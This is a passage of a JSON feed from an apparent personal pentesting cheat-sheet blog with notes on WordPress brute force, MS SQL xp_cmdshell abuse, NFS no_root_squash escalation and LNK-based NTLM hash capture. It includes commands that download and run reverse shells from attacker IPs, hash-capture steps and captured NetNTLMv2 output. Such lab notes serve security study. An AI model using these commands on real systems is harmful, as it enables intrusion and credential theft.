Firefox/78.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Content-Length: 95&lt;methodCall&gt;&lt;methodName&gt;system.listMethods&lt;/methodName&gt;&lt;params&gt;&lt;/params&gt;&lt;/methodCall&gt;XML RPC calls# List all method calls&lt;methodCall&gt;&lt;methodName&gt;system.listMethods&lt;/methodName&gt;&lt;params&gt;&lt;/params&gt;&lt;/methodCall&gt;# Get blogs&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;username&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;password&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;# Uploading a file&lt;?xml version='1.0' encoding='utf-8'?&gt;&lt;methodCall&gt;\t&lt;methodName&gt;wp.uploadFile&lt;/methodName&gt;\t&lt;params&gt;\t\t&lt;param&gt;&lt;value&gt;&lt;string&gt;1&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;\t\t&lt;param&gt;&lt;value&gt;&lt;string&gt;username&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;\t\t&lt;param&gt;&lt;value&gt;&lt;string&gt;password&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;\t\t&lt;param&gt;\t\t\t&lt;value&gt;\t\t\t\t&lt;struct&gt;\t\t\t\t\t&lt;member&gt;\t\t\t\t\t\t&lt;name&gt;name&lt;/name&gt;\t\t\t\t\t\t&lt;value&gt;&lt;string&gt;filename.jpg&lt;/string&gt;&lt;/value&gt;\t\t\t\t\t&lt;/member&gt;\t\t\t\t\t&lt;member&gt;\t\t\t\t\t\t&lt;name&gt;type&lt;/name&gt;\t\t\t\t\t\t&lt;value&gt;&lt;string&gt;mime/type&lt;/string&gt;&lt;/value&gt;\t\t\t\t\t&lt;/member&gt;\t\t\t\t\t&lt;member&gt;\t\t\t\t\t\t&lt;name&gt;bits&lt;/name&gt;\t\t\t\t\t\t&lt;value&gt;&lt;base64&gt;&lt;![CDATA[---base64-encoded-data---]]&gt;&lt;/base64&gt;&lt;/value&gt;\t\t\t\t\t&lt;/member&gt;\t\t\t\t&lt;/struct&gt;\t\t\t&lt;/value&gt;\t\t&lt;/param&gt;\t&lt;/params&gt;&lt;/methodCall&gt;Themes  Maybe you can also find theme exploits?Plugins  You can search for plugin exploits also, one way of determining the plugin used is via html elements. Version can also be determined there.  You can also add --plugins-detection aggressive --plugins-version-detection aggressive in wpscanTroubleshoting  Sending POST to /xmlrpc.php produces 200 OK but with parse error. not well formed message most likely caused by missing php/xml parser library inside the server. I encountered this in HTB Tenten.References  Wordpress - HackTricks  HTB Tenten",
            "content_html": "<h2 id=\"version\">Version</h2><ul>  <li>On meta generators</li></ul><p><img src=\"/spindel/assets/Wordpress/3101332D-061A-4AFA-ACEA-18A476551E16.png\" alt=\"\" /></p><ul>  <li>Check interesting URL paths below</li></ul><h2 id=\"credentials\">Credentials</h2><ul>  <li>Seems you really need to find valid credentials to wordpress before exploiting</li>  <li>Try going to <code class=\"language-plaintext highlighter-rouge\">/?author=1</code> and enumerate from there to see the usernames</li>  <li>There is no default credentials. Installation will ask user to provide the creds.</li>  <li>You can guess valid usernames though</li></ul><p><img src=\"/spindel/assets/Wordpress/FCE001CA-BCC0-44B1-94FF-9B2152812FDF.png\" alt=\"\" /></p><h2 id=\"recon\">Recon</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Kickoff nmap</span>nmap <span class=\"nt\">-p80</span> <span class=\"nt\">--script</span> http-wordpress-enum,http-wordpress-users 10.10.71.200<span class=\"c\"># Using wpscan (you can remove api token but some</span><span class=\"c\"># information will not be displayed)</span><span class=\"c\"># NOTE: wpscan may not report all vulnerabilities specially</span><span class=\"c\"># on plugins</span>wpscan <span class=\"nt\">--url</span> http://10.10.10.29 <span class=\"nt\">--api-token</span> <span class=\"o\">{</span>API_TOKEN<span class=\"o\">}</span><span class=\"c\"># Similar to above but on another path</span>wpscan <span class=\"nt\">--url</span> http://10.10.10.29/wordpress <span class=\"nt\">--api-token</span> <span class=\"o\">{</span>API_TOKEN<span class=\"o\">}</span></code></pre></div></div><ul>  <li>Check for <code class=\"language-plaintext highlighter-rouge\">colorlib</code> in HTML elements. This is a WP plugin.</li></ul><h2 id=\"interesting-url-paths\">Interesting URL Paths</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># you may find version here</span>/wp-links-opml/wp-links-opml.php/readme.html<span class=\"c\"># uploads directory</span>/wp-content/uploads/YYYY/DD/FILENAME<span class=\"c\"># login</span>/wp-login.php</code></pre></div></div><h2 id=\"interesting-files\">Interesting files</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># DB credentials</span>wp-config.php</code></pre></div></div><h2 id=\"brute-force\">Brute Force</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Using nmap</span>map <span class=\"nt\">-p80</span> <span class=\"nt\">--script</span> http-wordpress-brute 10.10.10.29<span class=\"c\"># User IDs can be extracted from here. You can use</span><span class=\"c\"># burp sniper intruder and generate a list of user</span><span class=\"c\"># id from 1 to 100 using bash for loop.</span>curl <span class=\"nt\">-s</span> <span class=\"nt\">-I</span> <span class=\"nt\">-X</span> GET http://10.10.10.29/?author<span class=\"o\">=</span>1<span class=\"c\"># You can use this python script from</span><span class=\"c\"># https://github.com/relarizky/wpxploit</span><span class=\"c\"># This can take around 30 minutes to complete</span><span class=\"c\"># TIP: try using \"admin\" as username first</span><span class=\"nb\">cd</span> ~/data/tools/webapp/wpxploit./exploit.py http://10.10.127.229/wordpress 5 15<span class=\"c\"># You can also use wpscan</span>wpscan <span class=\"nt\">--url</span> http://10.10.127.229/wordpress <span class=\"nt\">--usernames</span> admin <span class=\"nt\">--passwords</span> /usr/share/wordlists/rockyou.txt</code></pre></div></div><ul>  <li>Once you have the credentials you can try uploading a PHP reverse shell</li>  <li>TIP: bruteforce is done by sending this POST data containing username and password</li></ul><div class=\"language-xml highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nt\">&lt;methodCall&gt;</span>  <span class=\"nt\">&lt;methodName&gt;</span>    wp.getUsersBlogs  <span class=\"nt\">&lt;/methodName&gt;</span>  <span class=\"nt\">&lt;params&gt;</span>    <span class=\"nt\">&lt;param&gt;</span>      <span class=\"nt\">&lt;value&gt;</span>        admin      <span class=\"nt\">&lt;/value&gt;</span>    <span class=\"nt\">&lt;/param&gt;</span>    <span class=\"nt\">&lt;param&gt;</span>      <span class=\"nt\">&lt;value&gt;</span>        gansta1      <span class=\"nt\">&lt;/value&gt;</span>    <span class=\"nt\">&lt;/param&gt;</span>  <span class=\"nt\">&lt;/params&gt;</span><span class=\"nt\">&lt;/methodCall&gt;</span></code></pre></div></div><h2 id=\"interesting-url-paths-1\">Interesting URL Paths</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># most can be reported by wpscan</span>/wp-content/uploads//wp-admin//wp-admin/update-core.php/wp-admin/upgrade.php/install.php/wp-cron.php<span class=\"c\"># can accept post requests if active</span>/xmlrpc.php<span class=\"c\"># others</span>/plugins/wp-content/plugins</code></pre></div></div><p>For xmlrpc.php, you can use burpsuite to send some POST requests like this.</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>POST /wordpress/xmlrpc.php HTTP/1.1Host: 10.10.10.29User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Content-Length: 95&lt;methodCall&gt;&lt;methodName&gt;system.listMethods&lt;/methodName&gt;&lt;params&gt;&lt;/params&gt;&lt;/methodCall&gt;</code></pre></div></div><h2 id=\"xml-rpc-calls\">XML RPC calls</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># List all method calls</span>&lt;methodCall&gt;&lt;methodName&gt;system.listMethods&lt;/methodName&gt;&lt;params&gt;&lt;/params&gt;&lt;/methodCall&gt;<span class=\"c\"># Get blogs</span>&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;username&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;password&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;<span class=\"c\"># Uploading a file</span>&lt;?xml <span class=\"nv\">version</span><span class=\"o\">=</span><span class=\"s1\">'1.0'</span> <span class=\"nv\">encoding</span><span class=\"o\">=</span><span class=\"s1\">'utf-8'</span>?&gt;&lt;methodCall&gt;\t&lt;methodName&gt;wp.uploadFile&lt;/methodName&gt;\t&lt;params&gt;\t\t&lt;param&gt;&lt;value&gt;&lt;string&gt;1&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;\t\t&lt;param&gt;&lt;value&gt;&lt;string&gt;username&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;\t\t&lt;param&gt;&lt;value&gt;&lt;string&gt;password&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;\t\t&lt;param&gt;\t\t\t&lt;value&gt;\t\t\t\t&lt;struct&gt;\t\t\t\t\t&lt;member&gt;\t\t\t\t\t\t&lt;name&gt;name&lt;/name&gt;\t\t\t\t\t\t&lt;value&gt;&lt;string&gt;filename.jpg&lt;/string&gt;&lt;/value&gt;\t\t\t\t\t&lt;/member&gt;\t\t\t\t\t&lt;member&gt;\t\t\t\t\t\t&lt;name&gt;type&lt;/name&gt;\t\t\t\t\t\t&lt;value&gt;&lt;string&gt;mime/type&lt;/string&gt;&lt;/value&gt;\t\t\t\t\t&lt;/member&gt;\t\t\t\t\t&lt;member&gt;\t\t\t\t\t\t&lt;name&gt;bits&lt;/name&gt;\t\t\t\t\t\t&lt;value&gt;&lt;<span class=\"nb\">base64</span><span class=\"o\">&gt;</span>&lt;<span class=\"o\">![</span>CDATA[---base64-encoded-data---]]&gt;&lt;/base64&gt;&lt;/value&gt;\t\t\t\t\t&lt;/member&gt;\t\t\t\t&lt;/struct&gt;\t\t\t&lt;/value&gt;\t\t&lt;/param&gt;\t&lt;/params&gt;&lt;/methodCall&gt;</code></pre></div></div><h2 id=\"themes\">Themes</h2><ul>  <li>Maybe you can also find theme exploits?</li></ul><p><img src=\"/spindel/assets/Wordpress/17000E5E-19E8-4681-A8D6-E9D0AA546605.png\" alt=\"\" /></p><h2 id=\"plugins\">Plugins</h2><ul>  <li>You can search for plugin exploits also, one way of determining the plugin used is via html elements. Version can also be determined there.</li></ul><p><img src=\"/spindel/assets/Wordpress/98C48061-F8E3-4613-B122-E45B3D750365.png\" alt=\"\" /></p><p><img src=\"/spindel/assets/Wordpress/0B054482-2FAF-43DA-B89C-1A847D63C7D9.png\" alt=\"\" /></p><ul>  <li>You can also add <code class=\"language-plaintext highlighter-rouge\">--plugins-detection aggressive --plugins-version-detection aggressive</code> in <code class=\"language-plaintext highlighter-rouge\">wpscan</code></li></ul><h2 id=\"troubleshoting\">Troubleshoting</h2><ul>  <li>Sending <code class=\"language-plaintext highlighter-rouge\">POST</code> to <code class=\"language-plaintext highlighter-rouge\">/xmlrpc.php</code> produces 200 OK but with <code class=\"language-plaintext highlighter-rouge\">parse error. not well formed</code> message most likely caused by <a href=\"https://github.com/maxcutler/python-wordpress-xmlrpc/issues/110\">missing php/xml parser library</a> inside the server. I encountered this in HTB Tenten.</li></ul><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress\">Wordpress - HackTricks</a></li>  <li>HTB Tenten</li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/01/31/wordpress",
            
            
            
            "tags": ["web","enum","wordpress"],
            
            "date_published": "2022-01-31T00:00:00+08:00",
            "date_modified": "2022-01-31T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/01/30/ms-sql",
            "title": "MS SQL",
            "summary": "MS SQL",
            "content_text": "Ports  1433/tcpGathering info# Nmapnmap -p1433 --script \"*ms-sql*\" 10.10.209.245Ways of logging in# Using impacketimpacket-mssqlclient ustoun.local/svc-kerb:superman@10.10.209.245# inside windows clisqlcmd /S localhost -q \"select @@version;\"# othersmssqlclient.py -windows-auth &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;mssqlclient.py &lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;SQL Commands-- checks versionselect @@version;-- show databasesEXEC sp_databases;-- checks if use has sysadmin privileges (1 means-- sysadmin)SELECT IS_SRVROLEMEMBER('sysadmin')-- enables xp_cmdshellEXEC sp_configure 'Show Advanced Options', 1;reconfigure;sp_configure;EXEC sp_configure 'xp_cmdshell', 1reconfigure;xp_cmdshell \"whoami\"-- executes commandsxp_cmdshell \"whoami\"xp_cmdshell dir-- make victim download from our machine (10.10.14.60)xp_cmdshell \"powershell \"IEX (New-Object Net.WebClient).DownloadString(\\\"http://10.10.14.60/shell.ps1\\\");\"-- Intercept NTLM hash of user (be sure to fire up-- responder first)SQL&gt; xp_dirtree '\\\\10.11.40.33\\anything'-- Transfer a reverse shell binary and execute itxp_cmdshell certutil -urlcache -f http://10.11.40.33/reverse.exe c:\\users\\SVC-Kerb.DC01\\reverse.exexp_cmdshell c:\\users\\SVC-Kerb.DC01\\reverse.exeFiles# may contain passwords, used for migration purposes*.dtsConfigOthers  OSCP personal cheatsheet",
            "content_html": "<h2 id=\"ports\">Ports</h2><ul>  <li>1433/tcp</li></ul><h2 id=\"gathering-info\">Gathering info</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Nmap</span>nmap <span class=\"nt\">-p1433</span> <span class=\"nt\">--script</span> <span class=\"s2\">\"*ms-sql*\"</span> 10.10.209.245</code></pre></div></div><h2 id=\"ways-of-logging-in\">Ways of logging in</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Using impacket</span>impacket-mssqlclient ustoun.local/svc-kerb:superman@10.10.209.245<span class=\"c\"># inside windows cli</span>sqlcmd /S localhost <span class=\"nt\">-q</span> <span class=\"s2\">\"select @@version;\"</span><span class=\"c\"># others</span>mssqlclient.py <span class=\"nt\">-windows-auth</span> &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;mssqlclient.py &lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;</code></pre></div></div><h2 id=\"sql-commands\">SQL Commands</h2><div class=\"language-sql highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">-- checks version</span><span class=\"k\">select</span> <span class=\"o\">@@</span><span class=\"k\">version</span><span class=\"p\">;</span><span class=\"c1\">-- show databases</span><span class=\"k\">EXEC</span> <span class=\"n\">sp_databases</span><span class=\"p\">;</span><span class=\"c1\">-- checks if use has sysadmin privileges (1 means</span><span class=\"c1\">-- sysadmin)</span><span class=\"k\">SELECT</span> <span class=\"n\">IS_SRVROLEMEMBER</span><span class=\"p\">(</span><span class=\"s1\">'sysadmin'</span><span class=\"p\">)</span><span class=\"c1\">-- enables xp_cmdshell</span><span class=\"k\">EXEC</span> <span class=\"n\">sp_configure</span> <span class=\"s1\">'Show Advanced Options'</span><span class=\"p\">,</span> <span class=\"mi\">1</span><span class=\"p\">;</span><span class=\"n\">reconfigure</span><span class=\"p\">;</span><span class=\"n\">sp_configure</span><span class=\"p\">;</span><span class=\"k\">EXEC</span> <span class=\"n\">sp_configure</span> <span class=\"s1\">'xp_cmdshell'</span><span class=\"p\">,</span> <span class=\"mi\">1</span><span class=\"n\">reconfigure</span><span class=\"p\">;</span><span class=\"n\">xp_cmdshell</span> <span class=\"nv\">\"whoami\"</span><span class=\"c1\">-- executes commands</span><span class=\"n\">xp_cmdshell</span> <span class=\"nv\">\"whoami\"</span><span class=\"n\">xp_cmdshell</span> <span class=\"n\">dir</span><span class=\"c1\">-- make victim download from our machine (10.10.14.60)</span><span class=\"n\">xp_cmdshell</span> <span class=\"nv\">\"powershell \"</span><span class=\"n\">IEX</span> <span class=\"p\">(</span><span class=\"k\">New</span><span class=\"o\">-</span><span class=\"k\">Object</span> <span class=\"n\">Net</span><span class=\"p\">.</span><span class=\"n\">WebClient</span><span class=\"p\">).</span><span class=\"n\">DownloadString</span><span class=\"p\">(</span><span class=\"err\">\\</span><span class=\"nv\">\"http://10.10.14.60/shell.ps1</span><span class=\"se\">\\\"</span><span class=\"nv\">);\"</span><span class=\"c1\">-- Intercept NTLM hash of user (be sure to fire up</span><span class=\"c1\">-- responder first)</span><span class=\"k\">SQL</span><span class=\"o\">&gt;</span> <span class=\"n\">xp_dirtree</span> <span class=\"s1\">'</span><span class=\"se\">\\\\</span><span class=\"s1\">10.11.40.33</span><span class=\"se\">\\a</span><span class=\"s1\">nything'</span><span class=\"c1\">-- Transfer a reverse shell binary and execute it</span><span class=\"n\">xp_cmdshell</span> <span class=\"n\">certutil</span> <span class=\"o\">-</span><span class=\"n\">urlcache</span> <span class=\"o\">-</span><span class=\"n\">f</span> <span class=\"n\">http</span><span class=\"p\">:</span><span class=\"o\">//</span><span class=\"mi\">10</span><span class=\"p\">.</span><span class=\"mi\">11</span><span class=\"p\">.</span><span class=\"mi\">40</span><span class=\"p\">.</span><span class=\"mi\">33</span><span class=\"o\">/</span><span class=\"n\">reverse</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"k\">c</span><span class=\"p\">:</span><span class=\"err\">\\</span><span class=\"n\">users</span><span class=\"err\">\\</span><span class=\"n\">SVC</span><span class=\"o\">-</span><span class=\"n\">Kerb</span><span class=\"p\">.</span><span class=\"n\">DC01</span><span class=\"err\">\\</span><span class=\"n\">reverse</span><span class=\"p\">.</span><span class=\"n\">exe</span><span class=\"n\">xp_cmdshell</span> <span class=\"k\">c</span><span class=\"p\">:</span><span class=\"err\">\\</span><span class=\"n\">users</span><span class=\"err\">\\</span><span class=\"n\">SVC</span><span class=\"o\">-</span><span class=\"n\">Kerb</span><span class=\"p\">.</span><span class=\"n\">DC01</span><span class=\"err\">\\</span><span class=\"n\">reverse</span><span class=\"p\">.</span><span class=\"n\">exe</span></code></pre></div></div><h2 id=\"files\">Files</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># may contain passwords, used for migration purposes</span><span class=\"k\">*</span>.dtsConfig</code></pre></div></div><h2 id=\"others\">Others</h2><ul>  <li><a href=\"https://liodeus.github.io/2020/09/18/OSCP-personal-cheatsheet.html#mssql---1433\">OSCP personal cheatsheet</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/01/30/ms-sql",
            
            
            
            "tags": ["db","enum"],
            
            "date_published": "2022-01-30T00:00:00+08:00",
            "date_modified": "2022-01-30T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/01/29/nfs-no-root-squash",
            "title": "NFS no_root_squash",
            "summary": "NFS no_root_squash",
            "content_text": "OverviewIf an NFS export contains no_root_squash option, attacker can mount that export on his machine and modify any file acting as root user.Steps  Mount share on attacker machine  Inside victim machine, copy /bin/bash# e.g /home/james is an NFS exportcd /home/jamescp /bin/bash .  From attacker machinecd /mntsudo chown root:root bashsudo chmod u+s bash  Back to victim machine,./bash -p# enjoy!",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>If an NFS export contains <code class=\"language-plaintext highlighter-rouge\">no_root_squash</code> option, attacker can mount that export on his machine and modify any file acting as root user.</p><h2 id=\"steps\">Steps</h2><ul>  <li>Mount share on attacker machine</li>  <li>Inside victim machine, copy <code class=\"language-plaintext highlighter-rouge\">/bin/bash</code></li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># e.g /home/james is an NFS export</span><span class=\"nb\">cd</span> /home/james<span class=\"nb\">cp</span> /bin/bash <span class=\"nb\">.</span></code></pre></div></div><ul>  <li>From attacker machine</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">cd</span> /mnt<span class=\"nb\">sudo chown </span>root:root bash<span class=\"nb\">sudo chmod </span>u+s bash</code></pre></div></div><ul>  <li>Back to victim machine,</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>./bash <span class=\"nt\">-p</span><span class=\"c\"># enjoy!</span></code></pre></div></div>",
            "url": "https://mvineza.github.io/spindel/2022/01/29/nfs-no-root-squash",
            
            
            
            "tags": ["linux","privesc","nfs"],
            
            "date_published": "2022-01-29T00:00:00+08:00",
            "date_modified": "2022-01-29T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/01/24/zipped-lnk-files-over-smb",
            "title": "Zipped LNK files over SMB",
            "summary": "Zipped LNK files over SMB",
            "content_text": "OverviewAttackers can upload a .zip file containing .lnk file to a smb share. The .link file can contain malicuous code such as connecting back to attacker’s own evil smb share.Once a victim unzips that file, attacker can intercept the user’s hash.Requirements  SMB share on victim machine that attacker has accessSteps  Downlod mslink. You will use that to create a malicuous link file.  Create a malicuous link file that will connect to your own evil share.~/data/tools/mslink_v1.3.sh -l whatever -n hook -i \\\\\\\\10.11.40.33\\\\share -o hook.lnk  Compress it.zip hook.zip hook.lnk  Create an SMB share on your attacker machineimpacket-smbserver -smb2support share .  Upload the zip file to the SMB share of victim machine.smb: \\&gt; put hook.zip  Sit back and enjoyImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation[*] Config file parsed[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0[*] Config file parsed[*] Config file parsed[*] Config file parsed[*] Incoming connection (10.10.147.136,50222)[*] AUTHENTICATE_MESSAGE (SET\\MichelleWat,SET)[*] User SET\\MichelleWat authenticated successfully[*] MichelleWat::SET:aaaaaaaaaaaaaaaa:ca86a1caeea26a1753bd2092bb6bb76a:010100000000000080132f632685d701fdefe7ef95805d14000000000100100045005a004d00730073007000670054000300100045005a004d0073007300700067005400020010006a006400440075005900750043004b00040010006a006400440075005900750043004b000700080080132f632685d70106000400020000000800300030000000000000000000000000200000c55f192792fa477d1dab3770e98ac03ac9505a65cb2137d024633f7e80b04eb20a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310031002e00340030002e00330033000000000000000000[*] Closing down connection (10.10.147.136,50222)[*] Remaining connections [][*] Incoming connection (10.10.147.136,50223)[*] AUTHENTICATE_MESSAGE (SET\\MichelleWat,SET)[*] User SET\\MichelleWat authenticated successfully[*] MichelleWat::SET:aaaaaaaaaaaaaaaa:3b1d30ff9e5129ad225cc8129e3a9fa5:010100000000000000aac7632685d701b14749bbc7f0a2db000000000100100045005a004d00730073007000670054000300100045005a004d0073007300700067005400020010006a006400440075005900750043004b00040010006a006400440075005900750043004b000700080000aac7632685d70106000400020000000800300030000000000000000000000000200000c55f192792fa477d1dab3770e98ac03ac9505a65cb2137d024633f7e80b04eb20a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310031002e00340030002e00330033000000000000000000[*] Closing down connection (10.10.147.136,50223)[*] Remaining connections [][*] Incoming connection (10.10.147.136,50224)[*] AUTHENTICATE_MESSAGE (SET\\MichelleWat,SET)[*] User SET\\MichelleWat authenticated successfully[*] MichelleWat::SET:aaaaaaaaaaaaaaaa:39d0e73f4909f98a02f8be457e765a0f:0101000000000000804060642685d701cefc2fd6b5e9dc17000000000100100045005a004d00730073007000670054000300100045005a004d0073007300700067005400020010006a006400440075005900750043004b00040010006a006400440075005900750043004b0007000800804060642685d70106000400020000000800300030000000000000000000000000200000c55f192792fa477d1dab3770e98ac03ac9505a65cb2137d024633f7e80b04eb20a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310031002e00340030002e00330033000000000000000000[*] Closing down connection (10.10.147.136,50224)[*] Remaining connections []  You will be able to capture the NLMv2 hashes. You can now use hashcat to crack it.Other InfoHere is the script that process the zip files inside smb share.@echo offSET source=\"C:\\Shares\\Files\"SET extracted=\"C:\\Shares\\extracted\"powershell.exe -NoP -NonI -Command \"Expand-Archive '%source%\\*.zip' '%extracted%'\"FOR /f \"tokens=*\" %%G IN ('dir /s /b %extracted%\\..\\*.') DO (explorer %%G)\tping -n 3 127.1&gt;NULtaskkill /IM explorer.exermdir %extracted% /q /sdel %source%\\*.zip -jReferences  How Attackers are Using LNK Files to Download Malware",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>Attackers can upload a <code class=\"language-plaintext highlighter-rouge\">.zip</code> file containing <code class=\"language-plaintext highlighter-rouge\">.lnk</code> file to a smb share. The <code class=\"language-plaintext highlighter-rouge\">.link</code> file can contain malicuous code such as connecting back to attacker’s own evil smb share.</p><p>Once a victim unzips that file, attacker can intercept the user’s hash.</p><h2 id=\"requirements\">Requirements</h2><ul>  <li>SMB share on victim machine that attacker has access</li></ul><h2 id=\"steps\">Steps</h2><ul>  <li>Downlod <a href=\"http://www.mamachine.org/mslink/index.en.html\">mslink</a>. You will use that to create a malicuous link file.</li>  <li>Create a malicuous link file that will connect to your own evil share.</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>~/data/tools/mslink_v1.3.sh <span class=\"nt\">-l</span> whatever <span class=\"nt\">-n</span> hook <span class=\"nt\">-i</span> <span class=\"se\">\\\\\\\\</span>10.11.40.33<span class=\"se\">\\\\</span>share <span class=\"nt\">-o</span> hook.lnk</code></pre></div></div><ul>  <li>Compress it.</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>zip hook.zip hook.lnk</code></pre></div></div><ul>  <li>Create an SMB share on your attacker machine</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>impacket-smbserver <span class=\"nt\">-smb2support</span> share <span class=\"nb\">.</span></code></pre></div></div><ul>  <li>Upload the zip file to the SMB share of victim machine.</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>smb: \\&gt; put hook.zip</code></pre></div></div><ul>  <li>Sit back and enjoy</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Config file parsed<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Callback added <span class=\"k\">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Callback added <span class=\"k\">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Config file parsed<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Config file parsed<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Config file parsed<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Incoming connection <span class=\"o\">(</span>10.10.147.136,50222<span class=\"o\">)</span><span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> AUTHENTICATE_MESSAGE <span class=\"o\">(</span>SET<span class=\"se\">\\M</span>ichelleWat,SET<span class=\"o\">)</span><span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> User SET<span class=\"se\">\\M</span>ichelleWat authenticated successfully<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> MichelleWat::SET:aaaaaaaaaaaaaaaa:ca86a1caeea26a1753bd2092bb6bb76a:010100000000000080132f632685d701fdefe7ef95805d14000000000100100045005a004d00730073007000670054000300100045005a004d0073007300700067005400020010006a006400440075005900750043004b00040010006a006400440075005900750043004b000700080080132f632685d70106000400020000000800300030000000000000000000000000200000c55f192792fa477d1dab3770e98ac03ac9505a65cb2137d024633f7e80b04eb20a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310031002e00340030002e00330033000000000000000000<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Closing down connection <span class=\"o\">(</span>10.10.147.136,50222<span class=\"o\">)</span><span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Remaining connections <span class=\"o\">[]</span><span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Incoming connection <span class=\"o\">(</span>10.10.147.136,50223<span class=\"o\">)</span><span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> AUTHENTICATE_MESSAGE <span class=\"o\">(</span>SET<span class=\"se\">\\M</span>ichelleWat,SET<span class=\"o\">)</span><span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> User SET<span 